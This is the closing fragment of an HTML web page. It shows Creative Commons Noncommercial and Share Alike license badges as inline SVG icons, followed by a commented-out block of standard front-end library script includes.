                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-nc height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Noncommercial</title>
                    <symbol id=ai:fa6-brands:creative-commons-nc>
                        <path d="M247.6 8C387.4 8 496 115.9 496 256c0 147.2-118.5 248-248.4 248C113.1 504 0 393.2 0 256C0 123.1 104.7 8 247.6 8zM55.8 189.1c-7.4 20.4-11.1 42.7-11.1 66.9c0 110.9 92.1 202.4 203.7 202.4c122.4 0 177.2-101.8 178.5-104.1l-93.4-41.6c-7.7 37.1-41.2 53-68.2 55.4v38.1h-28.8V368c-27.5-.3-52.6-10.2-75.3-29.7l34.1-34.5c31.7 29.4 86.4 31.8 86.4-2.2c0-6.2-2.2-11.2-6.6-15.1c-14.2-6-1.8-.1-219.3-97.4zM248.4 52.3c-38.4 0-112.4 8.7-170.5 93l94.8 42.5c10-31.3 40.4-42.9 63.8-44.3v-38.1h28.8v38.1c22.7 1.2 43.4 8.9 62 23L295 199.7c-42.7-29.9-83.5-8-70 11.1c53.4 24.1 43.8 19.8 93 41.6l127.1 56.7c4.1-17.4 6.2-35.1 6.2-53.1c0-57-19.8-105-59.3-143.9c-39.3-39.9-87.2-59.8-143.6-59.8z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-nc></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Noncommercial</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-sa height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Share Alike</title>
                    <symbol id=ai:fa6-brands:creative-commons-sa>
                        <path d="M247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3zM137.7 221c13-83.9 80.5-95.7 108.9-95.7c99.8 0 127.5 82.5 127.5 134.2c0 63.6-41 132.9-128.9 132.9c-38.9 0-99.1-20-109.4-97h62.5c1.5 30.1 19.6 45.2 54.5 45.2c23.3 0 58-18.2 58-82.8c0-82.5-49.1-80.6-56.7-80.6c-33.1 0-51.7 14.6-55.8 43.8h18.2l-49.2 49.2l-49-49.2h19.4z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-sa></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Share Alike</p>
                </div>
            </span>
        </a>
    </div>
<!--
<script type="text/javascript" src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/bootstrap@5.2.1/dist/js/bootstrap.min.js"></script>
<div id="back-to-top" class=""><svg viewBox="0 0 24 24"><path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z"></path></svg></div>
-->
</div>
</body>
</html>
